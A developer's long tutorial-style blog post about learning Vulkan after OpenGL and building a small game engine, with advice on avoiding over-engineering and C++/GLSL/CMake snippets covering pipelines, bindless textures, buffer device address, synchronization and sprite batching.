studying graphics programming around 1.5 years ago by learning OpenGL and writing a 3D engine in it.The engine I wrote in Vulkan is mostly suited for smaller level-based games. I’ll explain things which worked for me, but they might not be the most efficient. My implementation would probably still be a good starting point for many people.
  Hopefully, this article will help make some things about Vulkan clearer to you. But you also need to be patient. It took me  to implement what I have today and I did it by cutting corners in many places. But if a self-taught programmer like me can build something with Vulkan, then so can you!
Learning graphics programming
  This is a very high level overview of how I learned some graphics programming myself. If there’s interest, I might write another article with more resources and helpful guidelines.
If you haven’t done any graphics programming before, you should start with OpenGL. It’s much easier to learn it and not get overwhelmed by all the complexity that Vulkan has. A lot of your OpenGL and graphics programming knowledge will be useful when you start doing things with Vulkan later.Ideally, you should at least get a textured model displayed on the screen with some simple Blinn-Phong lighting. I can also recommend doing some basic shadow mapping too, so that you learn how to render your scene from a different viewpoint and to a different render target, how to sample from depth textures and so on.I can recommend using the following resources to learn OpenGL:Sadly, most OpenGL resources don’t teach the latest OpenGL 4.6 practices. They make writing OpenGL a lot more enjoyable. If you learn them, transitioning to Vulkan will be much easier (I only learned about OpenGL 3.3 during my previous engine development, though, so it’s not a necessity).Here are some resources which teach you the latest OpenGL practices:
  It’s also good to have some math knowledge, especially linear algebra: how to work with vectors, transformation matrices and quaternions. My favorite book about linear algebra/math is 3D Math Primer for Graphics and Game Development by F. Dunn and I. Parbery. You don’t need to read it all in one go - use it as a reference if some math in the OpenGL resources above doesn’t make sense to you.
Bike-shedding and how to avoid itAh, bike-shedding… Basically, it’s a harmful pattern of overthinking and over-engineering even the simplest things. It’s easy to fall into this trap when doing graphics programming ( when doing Vulkan since you need to make many choices when implementing an engine with it).Always ask yourself “Do I  need this?”, “Will this thing ever become a bottleneck?”.Remember that you can always rewrite any part of your game/engine later.Don’t implement something unless you need it . Don’t think “Well, a good engine needs X, right…?”.Don’t try to make a general purpose game engine. It’s probably even better to not think about “the engine” at first and write a simple game.Make a small game first - a Breakout clone, for example. Starting your engine development by doing a Minecraft clone with multiplayer support is probably not a good idea.Be wary of people who tend to suggest complicated solutions to simple problems.Don’t look too much at what other people do. I’ve seen many over-engineered engines on GitHub - sometimes they’re that complex for a good reason (and there are  of work behind them). But you probably don’t need most of that complexity, especially for simpler games.Don’t try to make magical wrappers around Vulkan interfaces prematurely, especially while you’re still learning Vulkan.Get it working first. Leave “TODO”/“FIXME” comments in some places. Then move on to the next thing. Try to fix “TODO”/“FIXME” places only when they really become problematic or bottleneck your performance. You’ll be surprised to see how many things won’t become a problem at all.
  Some of this advice only applies when you’re working alone on a hobby project. Of course, it’s much harder to rewrite something from scratch when others start to depend on it and a “temp hack” becomes a fundamental part of the engine which is very hard to change without breaking many things.
Ask yourself if you need to learn a graphics API at all. If your main goal is to make a game as soon as possible, then you might be better off using something like Godot or Unreal Engine.However, there’s nothing wrong with reinventing the wheel or doing something from scratch. Especially if you do it just for fun, to get into graphics programming or to get an in-depth knowledge about how something works.The situation with graphic APIs in 2024 is somewhat complicated. It all depends on the use case: DirectX seems like the most solid choice for most AAA games. WebGL or WebGPU are the only two choices for doing 3D graphics on the web. Metal is the go-to graphics API on macOS and iOS (though you can still do Vulkan there via MoltenVK).My use case is simple: I want to make small 3D games for desktop platforms (Windows and Linux mostly). I also love open source technology and open standards. So, it was a choice between OpenGL and Vulkan for me.OpenGL is a good enough choice for many small games. But it’s very unlikely that it’ll get new versions in the future (so you can’t use some newest GPU capabilities like ray tracing), it’s deprecated on macOS and its future is uncertain.WebGPU was also a possible choice. Before learning Vulkan, I learned some of it. It’s a pretty solid API, but I had some problems with it:It’s still not stable and there’s not a lot of tutorials and examples for it. This tutorial is fantastic, though.WGSL is an okay shading language, but I just find its syntax not as pleasant as GLSL’s (note that you can write in GLSL and then load compiled SPIR-V on WebGPU native).On desktop, it’s essentially a wrapper around other graphic APIs (DirectX, Vulkan, Metal).This introduces additional problems for me:
It can’t do things some things that Vulkan or DirectX can do.It has more limitations than native graphic APIs since it needs to behave similarly between them.RenderDoc captures become confusing as they differ between the platforms (you can get DirectX capture on Windows and Vulkan capture on Linux) and you don’t have 1-to-1 mapping between WebGPU calls and native API calls.Using Dawn and WGPU feels like using bgfx or sokol. You don’t get the same degree of control over the GPU and some of the choices/abstractions might not be the most pleasant for you.No bindless textures (WIP discussion here).No push constants (WIP discussion here).Still, I think that WebGPU is a better API than OpenGL/WebGL and can be more useful to you than Vulkan in some use cases:Validation errors are much better than in OpenGL/WebGL and not having global state helps a lot.It’s also kind of similar to Vulkan in many things, so learning a bit of it before diving into Vulkan also helped me a lot.It requires a lot less boilerplate to get things on the screen (compared to Vulkan).You don’t have to deal with explicit synchronization which makes things much simpler.You can make your games playable inside the browser.Learning Vulkan seemed like an impossible thing for me previously. It felt like you needed to have many years of AAA game graphics programming experience to be able to do things in it. You also hear people saying “you’re basically writing a graphics driver when writing in Vulkan” which also made Vulkan sounds like an incredibly complicated thing.I have also checked out some engines written in Vulkan before and was further demotivated by seeing tons of scary abstractions and files named like  or  which had thousands of lines of scary C++ code.The situation has changed over the years. Vulkan is not as complicated as it was before. First of all, Khronos realized that some parts of Vulkan were indeed very complex and introduced some newer features which made many things much simpler (for example, dynamic rendering). Secondly, some very useful libraries which reduce boilerplate were implemented. And finally, there are a lot of fantastic resources which make learning Vulkan much easier than it was before.The best Vulkan learning resource which helped me get started was vkguide. If you’re starting from scratch, just go through it all (you might stop at “GPU driver rendering” chapter at first - many simple games probably won’t need this level of complexity)Vulkan Lecture Series by TU Wien also nicely teaches Vulkan basics (you can probably skip “Real-Time Ray Tracing” chapter for now). I especially found a lecture on synchronization very helpful.Here are some more advanced Vulkan books that also helped me:Here’s the result of my first month of learning Vulkan:Shadow mapping and cascaded shadow mapsOf course, doing it for the 3rd time (I had it implemented it all in OpenGL and WebGPU before) certainly helped. Once you get to this point, Vulkan won’t seem as scary anymore.Let’s see how the engine works and some useful things I learned.Engine overview and frame analysisMy engine is called EDBR (Elias Daler’s Bikeshed Engine) and was initially started as a project for learning Vulkan. It quickly grew into a somewhat usable engine which I’m going to use for my further projects.At the time of writing this article, the source code line counts are as follows:Engine itself: 19k lines of code
6.7k LoC related to graphics,2k LoC are light abstractions around Vulkan2D platformer game: 1.2k LoCI copy-pasted some non-graphics related stuff from my previous engine (e.g. input handling and audio system) but all of the graphics and many other core systems were rewritten from scratch. I feel like it was a good way to do it instead of trying to cram Vulkan into my old OpenGL abstractions.
  You can follow the commit history which shows how I started from clearing the screen, drawing the first triangle, drawing a textured quad and so on. It might be easier to understand the engine when it was simpler and smaller.
Let’s see how this frame in rendered:
  Most of the steps will be explained in more detail below.
First, models with skeletal animations are skinned in the compute shader. The compute shader takes unskinned mesh and produces a buffer of vertices which are then used instead of the original mesh in later rendering steps. This allows me to treat static and skinned meshes similarly in shaders and not do skinning repeatedly in different rendering steps.CSM (Cascaded Shadow Mapping)I use a 4096x4096 depth texture with 3 slices for cascaded shadow mapping. The first slice looks like this:All the models are drawn and shading is calculated using the shadow map and light info. I use a PBR model which is almost identical to the one described in Physically Based Rendering in Filament. The fragment shader is quite big and does calculation for all the lights affecting the drawn mesh in one draw call:Everything is drawn into a multi-sampled texture. Here’s how it looks after resolve:(Open the previous two screenshots in the next tab and flip between the tabs to see the difference more clearly)Depth resolve step is performed manually via a fragment shader. I just go through all the fragments of multi-sample depth texture and write the minimum value into the non-MS depth texture (it’ll be useful in the next step).Some post FX is applied - right now it’s only depth fog (I use “depth resolve” texture from the previous step here), afterwards tone-mapping and bloom will also be done here.Dialogue UI is drawn. Everything is done in one draw call (more is explained in “Drawing many sprites” section)And that’s it! It’s pretty basic right now and would probably become much more complex in the future (see “Future work” section).There are a couple of libraries which greatly improve the experience of writing Vulkan. Most of them are already used in vkguide, but I still want to highlight how helpful they were to me.vk-bootstrap simplifies a lot of Vulkan boilerplate: physical device selection, swapchain creation and so on.I don’t like big wrappers around graphic APIs because they tend to be very opinionated. Plus, you need to keep a mental map of “wrapper function vs function in the API spec” in your head at all times.Thankfully, vk-bootstrap is not like this. It mostly affects the initialization step of your program and doesn’t attempt to be a wrapper around every Vulkan function.
  When I was learning Vulkan, I started doing Vulkan from scratch, without using any 3rd party libraries. Replacing big amounts of the initialization code with vk-bootstrap was a joy. It’s really worth it.
I’ll be honest, I used VMA without even learning about how to allocate memory in Vulkan manually. I read about it in the Vulkan spec later - I’m glad that I didn’t have to do it on my own.Volk was very useful for me for simplifying extension function loading. For example, if you want to use very useful vkSetDebugUtilsObjectNameEXT for setting debug names for your objects (useful for RenderDoc captures and validation errors), you’ll need to do this if you don’t use volk:// store this pointer somewhere
PFN_vkSetDebugUtilsObjectNameEXT pfnSetDebugUtilsObjectNameEXT;

// during your game init
pfnSetDebugUtilsObjectNameEXT = (PFN_vkSetDebugUtilsObjectNameEXT)
    vkGetInstanceProcAddr(instance, "vkSetDebugUtilsObjectNameEXT");

// and finally in your game code
pfnSetDebugUtilsObjectNameEXT(device, ...);
With volk, all the extensions are immediately loaded after you call  and you don’t need to store these pointers everywhere. You just include  and call vkSetDebugUtilsObjectNameEXT - beautiful!I have a  class which encapsulates most of the commonly used functionality and stores many objects that you need for calling Vulkan functions (,  and so on). A single  instance is created on the startup and then gets passed around.Vulkan context initialization.Swapchain creation and management. returns a new  which is later used in all the drawing steps. does drawing to the swapchain and does sync between the frames.Image creation and loading textures from files.Bindless descriptor set management (see “Bindless descriptors” section below).That’s… a lot of things. However, it’s not that big:  is only 714 lines at the time of writing this article. It’s more convenient to pass one object into the function instead of many (, ,  and so on).In Vulkan, you can use any shading language which compiles to SPIR-V - that means that you can use GLSL, HLSL and others. I chose GLSL because I already knew it from my OpenGL experience.You can pre-compile your shaders during the build step or compile them on the fly. I do it during the build so that my shader loading runtime code is simpler. I also don’t have an additional runtime dependency on the shader compiler. Also, shader errors are detected during the build step and I don’t get compile errors during the runtime.I use glslc (from shaderc project, it’s included in Vulkan SDK) which allows you to specify a  in CMake which is incredibly useful when you use shader includes. If you change a shader file, all files which include it are recompiled automatically. Without the , CMake won’t be able to see which files shader files need to be recompiled and will only recompile the file which was changed.My CMake script for building shaders looks like this:function (target_shaders target shaders)
    set(SHADERS_BUILD_DIR "${CMAKE_CURRENT_BINARY_DIR}/shaders")
    file(MAKE_DIRECTORY "${SHADERS_BUILD_DIR}")
    foreach (SHADER_PATH ${SHADERS})
        get_filename_component(SHADER_FILENAME "${SHADER_PATH}" NAME)
        set(SHADER_SPIRV_PATH "${SHADERS_BUILD_DIR}/${SHADER_FILENAME}.spv")
        set(DEPFILE "${SHADER_SPIRV_PATH}.d")
        add_custom_command(
          COMMENT "Building ${SHADER_FILENAME}"
          OUTPUT "${SHADER_SPIRV_PATH}"
          COMMAND ${GLSLC} "${SHADER_PATH}" -o "${SHADER_SPIRV_PATH}" -MD -MF ${DEPFILE} -g
          DEPENDS "${SHADER_PATH}"
          DEPFILE "${DEPFILE}"
        )
        list(APPEND SPIRV_BINARY_FILES ${SHADER_SPIRV_PATH})
    endforeach()

    set(shaders_target_name "${target}_build_shaders")
    add_custom_target(${shaders_target_name}
      DEPENDS ${SPIRV_BINARY_FILES}
    )
    add_dependencies(${target} ${shaders_target_name})
endfunction()
and then in the main CMakeLists file:set(SHADERS
    skybox.frag
    skinning.comp
    ... // etc
)

# prepend shaders directory path
get_target_property(EDBR_SOURCE_DIR edbr SOURCE_DIR)
set(EDBR_SHADERS_DIR "${EDBR_SOURCE_DIR}/src/shaders/")
list(TRANSFORM SHADERS PREPEND "${EDBR_SHADERS_DIR}")

target_shaders(game ${SHADERS})
Now, when you build a  target, shaders get built automatically and the resulting SPIR-V files are put into the binary directory.Push constants, descriptor sets and bindless descriptorsPassing data to shaders in OpenGL is much simpler than it is in Vulkan. In OpenGL, you could just do this:const auto loc = glGetUniformLocation(shader, "someFloat");
glUseProgram(shader);
glUniform1f(loc, 42.f);
layout(location = 20) uniform float someFloat;
const auto loc = 20;
glUniform1f(loc, 42.f);
In Vulkan, you need to group your uniforms into “descriptor sets”:// set 0
layout (set = 0, binding = 0) uniform float someFloat;
layout (set = 0, binding = 1) uniform mat4 someMatrix;
// set 1
layout (set = 1, binding = 0) uniform float someOtherFloat;
... // etc.
Now, this makes things a lot more complicated, because you need to specify descriptor set layout beforehand, use descriptor set pools and allocate descriptor sets with them, do the whole  +  thing, call  for each descriptor set and so on.I’ll explain later how I avoided using descriptor sets by using bindless descriptors and buffer device access. Basically, I only have one “global” descriptor set for bindless textures and samplers, and that’s it. Everything else is passed via push constants which makes everything much easier to handle.I separate drawing steps into “pipeline” classes.Most of them look like this:class PostFXPipeline {
public:
    void init(GfxDevice& gfxDevice, VkFormat drawImageFormat);
    void cleanup(VkDevice device);

    void draw(
        VkCommandBuffer cmd,
        GfxDevice& gfxDevice,
        const GPUImage& drawImage,
        const GPUImage& depthImage,
        const GPUBuffer& sceneDataBuffer);

private:
    VkPipelineLayout pipelineLayout;
    VkPipeline pipeline;

    struct PushConstants {
        VkDeviceAddress sceneDataBuffer;
        std::uint32_t drawImageId;
        std::uint32_t depthImageId;
    };
};
 loads needed shaders and initializes  and :void PostFXPipeline::init(GfxDevice& gfxDevice, VkFormat drawImageFormat)
{
    const auto& device = gfxDevice.getDevice();

    const auto pcRange = VkPushConstantRange{
        .stageFlags = VK_SHADER_STAGE_FRAGMENT_BIT,
        .offset = 0,
        .size = sizeof(PushConstants),
    };

    const auto layouts = std::array{gfxDevice.getBindlessDescSetLayout()};
    const auto pushConstantRanges = std::array{pcRange};
    pipelineLayout = vkutil::createPipelineLayout(device, layouts, pushConstantRanges);

    const auto vertexShader =
        vkutil::loadShaderModule("shaders/fullscreen_triangle.vert.spv", device);
    const auto fragShader =
        vkutil::loadShaderModule("shaders/postfx.frag.spv", device);
    pipeline = PipelineBuilder{pipelineLayout}
                   .setShaders(vertexShader, fragShader)
                   .setInputTopology(VK_PRIMITIVE_TOPOLOGY_TRIANGLE_LIST)
                   .setPolygonMode(VK_POLYGON_MODE_FILL)
                   .disableCulling()
                   .setMultisamplingNone()
                   .disableBlending()
                   .setColorAttachmentFormat(drawImageFormat)
                   .disableDepthTest()
                   .build(device);
    vkutil::addDebugLabel(device, pipeline, "postFX pipeline");

    vkDestroyShaderModule(device, vertexShader, nullptr);
    vkDestroyShaderModule(device, fragShader, nullptr);
}
The  function is usually called once during the engine initialization.  abstraction is described in vkguide here. I modified it a bit to use the Builder pattern to be able to chain the calls. does all the needed cleanup. It usually simply destroys the pipeline and its layout:void PostFXPipeline::cleanup(VkDevice device)
{
    vkDestroyPipeline(device, pipeline, nullptr);
    vkDestroyPipelineLayout(device, pipelineLayout, nullptr);
}
 is called each frame and all the needed inputs are passed as arguments. It’s assumed that the sync is performed outside of the  call (see “Synchronization” section below). Some pipelines are only called once per frame - some either take  of objects to draw or are called like this:for (const auto& mesh : meshes) {
    somePipeline.draw(cmd, gfxDevice, mesh, ...);
}
The typical  function looks like this:void PostFXPipeline::draw(
    VkCommandBuffer cmd,
    GfxDevice& gfxDevice,
    const GPUImage& drawImage,
    const GPUImage& depthImage,
    const GPUBuffer& sceneDataBuffer)
{
    // Bind the pipeline
    vkCmdBindPipeline(cmd, VK_PIPELINE_BIND_POINT_GRAPHICS, pipeline);

    // Bind the bindless descriptor set
    gfxDevice.bindBindlessDescSet(cmd, pipelineLayout);

    // Handle push constants
    const auto pcs = PushConstants{
        // BDA - explained below
        .sceneDataBuffer = sceneDataBuffer.address,
        // bindless texture ids - no need for desc. sets!
        // explained below
        .drawImageId = drawImage.getBindlessId(),
        .depthImageId = depthImage.getBindlessId(),
    };
    vkCmdPushConstants(
        cmd, pipelineLayout, VK_SHADER_STAGE_FRAGMENT_BIT, 0, sizeof(PushConstants), &pcs);

    // Finally, do some drawing. Here we're drawing a fullscreen triangle
    // to do a full-screen effect.
    vkCmdDraw(cmd, 3, 1, 0, 0);
}
Note another thing: it’s assumed that  is called between  and  - the render pass itself doesn’t care what texture it renders to - the caller of  is responsible for that. It makes things simpler and allows you to do several draws to the same render target, e.g.:// handy wrapper for creating VkRenderingInfo
const auto renderInfo = vkutil::createRenderingInfo({
    .renderExtent = drawImage.getExtent2D(),
    .colorImageView = drawImage.imageView,
    .colorImageClearValue = glm::vec4{0.f, 0.f, 0.f, 1.f},
    .depthImageView = depthImage.imageView,
    .depthImageClearValue = 0.f,
    // for MSAA
    .resolveImageView = resolveImage.imageView,
});

vkCmdBeginRendering(cmd, &renderInfo.renderingInfo);

// draw meshes
for (const auto& mesh : meshesToDraw) {
    meshPipeline.draw(cmd, gfxDevice, mesh, ...);
}
// draw sky
skyboxPipeline.draw(cmd, gfxDevice, camera);

vkCmdEndRendering(cmd);

  I use  everywhere. I don’t use Vulkan render passes and subpasses at all. I’ve heard that they’re more efficient on tile-based GPUs, but I don’t care about mobile support for now.  just makes everything much easier.
Using programmable vertex pulling (PVP) + buffer device address (BDA)I have one vertex type for all the meshes. It looks like this:struct Vertex {
    vec3 position;
    float uv_x;
    vec3 normal;
    float uv_y;
    vec4 tangent;
};

  Of course, you can greatly optimize it using various methods, but it’s good enough for me for now. The / separation comes from vkguide - I think it’s a nice idea to get good alignment and not waste any bytes
The vertices are accessed in the shader like this:layout (buffer_reference, std430) readonly buffer VertexBuffer {
    Vertex vertices[];
};

layout (push_constant, scalar) uniform constants
{
    VertexBuffer vertexBuffer;
    ... // other stuff
} pcs;

void main()
{
    Vertex v = pcs.vertexBuffer.vertices[gl_VertexIndex];
    ...
}
PVP frees you from having to define vertex format (no more VAOs like in OpenGL or VkVertexInputBindingDescription + VkVertexInputAttributeDescription in Vulkan). BDA also frees you from having to bind a buffer to a descriptor set - you just pass an address to your buffer which contains vertices in push constants and that’s it.
  Also note the  layout for push constants. I use it for all the buffers too. Compared to “std430” layout, it makes alignment a lot more easy to handle - it almost works the same as in C++ and greatly reduces the need for “padding” members in C++ structs.
Textures were painful to work with even in OpenGL - you had “texture slots” which were awkward to work with. You couldn’t just sample any texture from the shader if it wasn’t bound to a texture slot beforehand.  changed that and made many things easier.Vulkan doesn’t have the exact same functionality, but it has something similar. You can create big descriptor sets which look like this:// bindless.glsl
layout (set = 0, binding = 0) uniform texture2D textures[];
...
layout (set = 0, binding = 1) uniform sampler samplers[];
You’ll need to maintain a list of all your textures using some “image manager” and when a new texture is loaded, you need to insert it into the  array. The index at which you inserted it becomes a bindless “texture id” which then can be used to sample it in shaders. Now you can pass these ids in your push constants like this:layout (push_constant, scalar) uniform constants
{
  uint textureId;
  ...
} pcs;
and then you can sample your texture in the fragment shader like this:// bindless.glsl
#define NEAREST_SAMPLER_ID 0
...

vec4 sampleTexture2DNearest(uint texID, vec2 uv) {
    return texture(nonuniformEXT(sampler2D(textures[texID], samplers[NEAREST_SAMPLER_ID])), uv);
}

// shader.frag
vec4 color = sampleTexture2DNearest(pcs.textureId, inUV);
I chose separate image samplers so that I could sample any texture using different samplers. Common samplers (nearest, linear with anisotropy, depth texture samplers) are created and put into  array on the startup.The wrapper function makes the process of sampling a lot more convenient.
  The placement of  is somewhat tricky and is explained very well here.
I use bindless ids for the mesh material buffer which looks like this:struct MaterialData {
    vec4 baseColor;
    vec4 metallicRoughnessEmissive;
    uint diffuseTex;
    uint normalTex;
    uint metallicRoughnessTex;
    uint emissiveTex;
};

layout (buffer_reference, std430) readonly buffer MaterialsBuffer {
    MaterialData data[];
} materialsBuffer;
Now I can only pass material ID in my push constants and then sample texture like this in the fragment shader:MaterialData material = materials[pcs.materialID];
vec4 diffuse = sampleTexture2DLinear(material.diffuseTex, inUV);
...
Neat! No more bulky descriptor sets, just one int per material in the push constants.You can also put different texture types into the same set like this (this is needed for being able to access textures of types other than ):layout (set = 0, binding = 0) uniform texture2D textures[];
layout (set = 0, binding = 0) uniform texture2DMS texturesMS[];
layout (set = 0, binding = 0) uniform textureCube textureCubes[];
layout (set = 0, binding = 0) uniform texture2DArray textureArrays[];
And here’s how you can sample  with a linear sampler (note that we use  here instead of ):vec4 sampleTextureCubeLinear(uint texID, vec3 p) {
    return texture(nonuniformEXT(samplerCube(textureCubes[texID], samplers[NEAREST_SAMPLER_ID])), p);
}
Here’s a very good article on using bindless textures in Vulkan:Handling dynamic data which needs to be uploaded every frameI find it useful to pre-allocate big arrays of things and push stuff to them in every frame.
Basically, you can pre-allocate an array of N structs (or matrices) and then start at index 0 at each new frame and push things to it from the CPU. Then, you can access all these items in your shaders. For example, I have all joint matrices stored in one big  array and the skinning compute shader accesses joint matrices of a particular mesh using start index passed via push constants (more about it will be explained later).Here are two ways of doing this:Have N buffers on GPU and swap between them.vkguide explains the concept of “in flight” frames pretty well. To handle this parallelism properly, you need to have one buffer for the “currently drawing” frame and one buffer for “currently recording new drawing commands” frame to not have races. (If you have more frames in flight, you’ll need to allocate more than 2 buffers)This means that you need to preallocate 2 buffers on GPU. You write data from CPU to GPU to the first buffer during the first frame. While you record the second frame, GPU reads from the first buffer while you write new data to the second buffer. On the third frame, GPU reads from the second buffer and you write new info to the first buffer… and so on.One buffer on GPU and N “staging” buffers on CPUThis might be useful if you need to conserve some memory on the GPU.Let’s see how it works in my engine:class NBuffer {
public:
    void init(
        GfxDevice& gfxDevice,
        VkBufferUsageFlags usage,
        std::size_t dataSize,
        std::size_t numFramesInFlight,
        const char* label);

    void cleanup(GfxDevice& gfxDevice);

    void uploadNewData(
        VkCommandBuffer cmd,
        std::size_t frameIndex,
        void* newData,
        std::size_t dataSize,
        std::size_t offset = 0);

    const GPUBuffer& getBuffer() const { return gpuBuffer; }

private:
    std::size_t framesInFlight{0};
    std::size_t gpuBufferSize{0};
    std::vector<GPUBuffer> stagingBuffers;
    GPUBuffer gpuBuffer;
    bool initialized{false};
};

void NBuffer::init(
    GfxDevice& gfxDevice,
    VkBufferUsageFlags usage,
    std::size_t dataSize,
    std::size_t numFramesInFlight,
    const char* label)
{
    ...

    gpuBuffer = gfxDevice.createBuffer(
        dataSize, usage | VK_IMAGE_USAGE_TRANSFER_DST_BIT, VMA_MEMORY_USAGE_AUTO_PREFER_DEVICE);
    vkutil::addDebugLabel(gfxDevice.getDevice(), gpuBuffer.buffer, label);

    for (std::size_t i = 0; i < numFramesInFlight; ++i) {
        stagingBuffers.push_back(gfxDevice.createBuffer(
            dataSize, usage | VK_BUFFER_USAGE_TRANSFER_SRC_BIT, VMA_MEMORY_USAGE_AUTO_PREFER_HOST));
    }

    ...
}
Note how staging buffers are created using VMA’s  flag and the “main” buffer from which we read in the shader is using the  flag.void NBuffer::uploadNewData(
    VkCommandBuffer cmd,
    std::size_t frameIndex,
    void* newData,
    std::size_t dataSize,
    std::size_t offset) const
{
    assert(initialized);
    assert(frameIndex < framesInFlight);
    assert(offset + dataSize <= gpuBufferSize && "NBuffer::uploadNewData: out of bounds write");

    if (dataSize == 0) {
        return;
    }

    // sync with previous read
    ... // READ BARRIER CODE HERE

    auto& staging = stagingBuffers[frameIndex];
    auto* mappedData = reinterpret_cast<std::uint8_t*>(staging.info.pMappedData);
    memcpy((void*)&mappedData[offset], newData, dataSize);

    const auto region = VkBufferCopy2{
        .sType = VK_STRUCTURE_TYPE_BUFFER_COPY_2,
        .srcOffset = (VkDeviceSize)offset,
        .dstOffset = (VkDeviceSize)offset,
        .size = dataSize,
    };
    const auto bufCopyInfo = VkCopyBufferInfo2{
        .sType = VK_STRUCTURE_TYPE_COPY_BUFFER_INFO_2,
        .srcBuffer = staging.buffer,
        .dstBuffer = gpuBuffer.buffer,
        .regionCount = 1,
        .pRegions = &region,
    };

    vkCmdCopyBuffer2(cmd, &bufCopyInfo);

    // sync with write
    ... // WRITE BARRIER CODE HERE
}
I’d go with the first approach for most cases (more data on GPU, but no need for manual sync) unless you need to conserve GPU memory for some reason. I’ve found no noticeable difference in performance between two approaches, but it might matter if you are uploading huge amounts of data to GPU on each frame.Destructors, deletion queue and cleanupNow, this might be somewhat controversial… but I didn’t find much use of the deletion queue pattern used in vkguide. I don’t really need to allocated/destroy new objects on every frame.Using C++ destructors for Vulkan object cleanup is not very convenient either. You need to wrap everything in custom classes, add move constructors and move … It adds an additional layer of complexity.In most cases, the cleanup of Vulkan objects happens in one place - and you don’t want to accidentally destroy some in-use object mid-frame by accidentally destroying some wrapper object.It’s also harder to manage lifetimes when you have cleanup in happening in the destructor. For example, suppose you have a case like this:struct SomeClass {
    SomeOtherClass b;

    void init() {
        ...
    }

    void cleanup() {
        ...
    }
}
If you want to cleanup  resources (e.g. the instance of  has a  object) during , you can’t do that if the cleanup of  is performed in its destructor.Of course, you can do this:struct SomeClass {
    std::unique_ptr<SomeOtherClass> b;

    void init() {
        b = std::make_unique<SomeOtherClass>();
        ...
    }

    void cleanup() {
        b.reset();
        ...
    }
}
… but I don’t like how it introduces a dynamic allocation and requires you to do write more code (and it’s not that much different from calling a  function manually).Right now, I prefer to clean up stuff directly, e.g.class SkyboxPipeline {
public:
    void cleanup(VkDevice device) {
        vkDestroyPipeline(device, pipeline, nullptr);
        vkDestroyPipelineLayout(device, pipelineLayout, nullptr);
    }

private:
    VkPipelineLayout pipelineLayout;
    VkPipeline pipeline;
    ...
}

// in GameRenderer.cpp:
void GameRenderer::cleanup(VkDevice device) {
    ...
    skyboxPipeline.cleanup(device);
    ...
}
This approach is not perfect - first of all, it’s easy to forget to call  function, This is not a huge problem since you get a validation error in case you forget to cleanup some Vulkan resources on shutdown:Validation Error: [ VUID-vkDestroyDevice-device-05137 ] Object 0: handle = 0x4256c1000000005d, type = VK_OBJECT_TYPE_PIPELINE_LAYOUT; | MessageID = 0x4872eaa0 | vkCreateDevice():  OBJ ERROR : For VkDevice 0x27bd530[], VkPipelineLayout 0x4256c1000000005d[] has not been destroyed. The Vulkan spec states: All child objects created on device must have been destroyed prior to destroying device (https://vulkan.lunarg.com/doc/view/1.3.280.1/linux/1.3-extensions/vkspec.html#VUID-vkDestroyDevice-device-05137)
VMA also triggers asserts if you forget to free some buffer/image allocated with it.I find it convenient to have all the Vulkan cleanup happening  in one place. It makes it easy to track when the objects get destroyed.Synchronization in Vulkan is difficult. OpenGL and WebGPU do it for you - if you read from some texture/buffer, you know that it will have the correct data and you won’t get problems with data races. With Vulkan, you need to be explicit and this is usually where things tend to get complicated.Right now I manage most of the complexities of sync manually in one place. I separate my drawing into “passes”/pipelines (as described above) and then insert barriers between them. For example, the skinning pass writes new vertex data into GPU memory. Shadow mapping pass reads this data to render skinned meshes into the shadow map. Sync in my code looks like this:// do skinning in compute shader
for (const auto& mesh : skinnedMeshes) {
    skinningPass.doSkinning(gfxDevice, mesh);
}

{
    // Sync skinning with CSM
    // This is a "fat" barrier and you can potentially optimize it
    // by specifying all the buffers that the next pass will read from
    const auto memoryBarrier = VkMemoryBarrier2{
        .sType = VK_STRUCTURE_TYPE_MEMORY_BARRIER_2,
        .srcStageMask = VK_PIPELINE_STAGE_2_COMPUTE_SHADER_BIT,
        .srcAccessMask = VK_ACCESS_2_SHADER_WRITE_BIT,
        .dstStageMask = VK_PIPELINE_STAGE_2_VERTEX_SHADER_BIT,
        .dstAccessMask = VK_ACCESS_2_MEMORY_READ_BIT,
    };
    const auto dependencyInfo = VkDependencyInfo{
        .sType = VK_STRUCTURE_TYPE_DEPENDENCY_INFO,
        .memoryBarrierCount = 1,
        .pMemoryBarriers = &memoryBarrier,
    };
    vkCmdPipelineBarrier2(cmd, &dependencyInfo);
}

// do shadow mapping
shadowMappingPass.draw(gfxDevice, ...);
Of course, this can be automated/simplified using render graphs. This is something that I might implement in the future. Right now I’m okay with doing manual sync. vkconfig’s “synchronization” validation layer also helps greatly in finding sync errors.The following resources were useful for understanding synchronization:More implementation notesWith bindless textures, it’s easy to draw many sprites using one draw call without having to allocate vertex buffers at all.First of all, you can emit vertex coordinates and UVs using  in your vertex shader like this:void main()
{
    uint b = 1 << (gl_VertexIndex % 6);
    vec2 baseCoord = vec2((0x1C & b) != 0, (0xE & b) != 0);
    ...
}
This snippet produces this set of values:Two triangles form a quadAll the sprite draw calls are combined into  which looks like this in GLSL:struct SpriteDrawCommand {
    mat4 transform; // could potentially be mat2x2...
    vec2 uv0; // top-left uv coord
    vec2 uv1; // bottom-right uv coord
    vec4 color; // color by which texture is multiplied
    uint textureID; // sprite texture
    uint shaderID; // explained below
    vec2 padding; // padding to satisfy "scalar" requirements
};

layout (buffer_reference, scalar) readonly buffer SpriteDrawBuffer {
    SpriteDrawCommand commands[];
};
On CPU/C++ side, it looks almost the same:struct SpriteDrawCommand {
    glm::mat4 transform;
    glm::vec2 uv0; // top-left uv coordinate
    glm::vec2 uv1; // bottom-right uv coodinate
    LinearColor color; // color by which texture is multiplied by
    std::uint32_t textureId; // sprite texture
    std::uint32_t shaderId; // explained below
    glm::vec2 padding; // padding
};

std::vector<SpriteDrawCommand> spriteDrawCommands;
I create two fixed size buffers on the GPU and then upload the contents of  (using techniques described above in the “Handling dynamic data” section).The sprite renderer is used like this:// record commands
renderer.beginDrawing();
{
    renderer.drawSprite(sprite, pos);
    renderer.drawText(font, "Hello");
    renderer.drawRect(...);
}
renderer.endDrawing();

// do actual drawing later:
renderer.draw(cmd, gfxDevice, ...);

  The same renderer also draws text, rectangles and lines in my engine. For example, the text is just N “draw sprite” commands for a string composed of N glyphs. Solid color rectangles and lines are achieved by using a 1x1 pixel white texture and multiplying it by  in the fragment shader.
And finally, here’s how the command to do the drawing looks like inside :vkCmdDraw(cmd, 6, spriteDrawCommands.size(), 0, 0);
// 6 vertices per instance, spriteDrawCommands.size() instances in total
The complete sprite.vert looks like this:#version 460

#extension GL_GOOGLE_include_directive : require
#extension GL_EXT_buffer_reference : require

#include "sprite_commands.glsl"

layout (push_constant) uniform constants
{
    mat4 viewProj; // 2D camera matrix
    SpriteDrawBuffer drawBuffer; // where sprite draw commands are stored
} pcs;

